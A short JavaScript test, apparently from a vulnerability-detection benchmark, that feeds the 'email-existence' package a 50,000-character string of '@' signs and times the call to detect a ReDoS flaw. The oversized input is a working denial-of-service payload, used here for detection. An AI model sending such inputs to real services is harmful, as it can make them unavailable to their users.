// test("ReDos in email-existence", () => {
  const measureTime = require("../utils").measureTime;
  const emailExistence = require("email-existence");
  let t = measureTime(function () {
    emailExistence.check("@".repeat(50000) + " ", () => {});
  });
  let time = t[0] + t[1] / 1000000000;
if (time > 1) {
	console.log("this_is_vulnerable")
} else {
	console.log("this_is_OK")
}
// });
